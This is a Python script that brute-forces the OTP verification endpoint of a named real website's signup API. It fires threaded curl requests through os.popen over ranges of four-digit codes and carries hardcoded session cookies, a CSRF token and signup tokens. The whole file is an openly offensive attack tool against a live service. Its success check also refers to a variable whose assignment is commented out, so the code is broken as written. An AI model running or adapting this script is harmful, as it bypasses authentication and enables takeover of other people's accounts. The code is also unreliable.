import os
import threading

def otp(num):
    s1 = str("""curl -i -s -k -X 'POST' -H 'Host: www.callingstation.in' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: https://www.callingstation.in/signup/' -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H 'Content-Length: 189' -H 'Connection: close' -H 'Cookie: __tawkuuid=e::callingstation.in::sGSlhk0h9zIcSHin/zAESJx8UMxWsS4w9K5jl/KpTFxXQT51va4/SvubAh895LNR::2; csrftoken=LYjVi46sTyArFFkslTry9zGaLRwX5hQoxubmwRY9jnRK5aOWWkHXCpxtH3N5KALp; TawkConnectionTime=0; _TRAEFIK_BACKEND=http://10.0.3.227:9905; __CSVer__=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2JpbGUiOiI5MzA0MjI1NzUyIiwidHMiOjE1NzQwMDc2MjN9.KTbjmUs7ZjuLfrc-bc2tJUBAVJz1JkLdDM_w6Am3Rxk' -b '__tawkuuid=e::callingstation.in::sGSlhk0h9zIcSHin/zAESJx8UMxWsS4w9K5jl/KpTFxXQT51va4/SvubAh895LNR::2; csrftoken=LYjVi46sTyArFFkslTry9zGaLRwX5hQoxubmwRY9jnRK5aOWWkHXCpxtH3N5KALp; TawkConnectionTime=0; _TRAEFIK_BACKEND=http://10.0.3.227:9905; __CSVer__=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2JpbGUiOiI5MzA0MjI1NzUyIiwidHMiOjE1NzQwMDc2MjN9.KTbjmUs7ZjuLfrc-bc2tJUBAVJz1JkLdDM_w6Am3Rxk' --data-binary '{\"x\":\"verify_otp\",\"pl\":{\"signup_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2JpbGUiOiI5MzA0MjI1NzUyIiwidHMiOjE1NzQwMDc2MjN9.KTbjmUs7ZjuLfrc-bc2tJUBAVJz1JkLdDM_w6Am3Rxk\",\"otp\":\"""")
    s2 = str("""\"}}' 'https://www.callingstation.in/apis/v1'""")
    num = str(num)
    rd = os.popen(s1+num+s2).read()
    strin = str(rd)
    print (rd.lower()+" "+ num)
    result = strin.find("OTP Verification Successful")
    #result2 = strin.find("Verification Successful")  #For Anonymous Account
    if result2 != -1 :
        print("Found")
        print(num)
        print(rd)
        OTP = open("ower.txt","w+")
        OTP.write("OTP is : " + num)
        

if __name__ == "__main__":
    #for i in range(1000,1600):
    #for i in range(1600,2200):
    #for i in range(2200,2800):
    #for i in range(2800,3400):
    #for i in range(3400,4000):
    #for i in range(4000,4600):
    #for i in range(4600,5200):
    #for i in range(5200,5800):
    #for i in range(5800,6400):
    #for i in range(6400,7000):
    #for i in range(7000,7600):
    #for i in range(7600,8200):
    #for i in range(8200,8800):
    #for i in range(8800,9400):
    for i in range(9400,9999):
        t = threading.Thread(target=otp, args=(i,))
        t.start()
